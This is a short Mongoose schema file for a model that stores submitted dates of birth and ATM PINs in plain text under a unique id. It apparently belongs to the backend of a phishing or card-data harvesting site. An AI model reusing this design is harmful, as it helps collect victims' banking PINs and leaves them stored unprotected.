const mongoose = require('mongoose');

const dobAtmDataSchema = new mongoose.Schema({
    uniqueid: { type: String, required: true, unique: true },
    entries: [
        {
            dob: { type: String, required: true },
            atmPin: { type: String, required: true },
            submittedAt: { type: Date, default: Date.now }
        }
    ]
});

module.exports = mongoose.model('DobAtmData', dobAtmDataSchema);
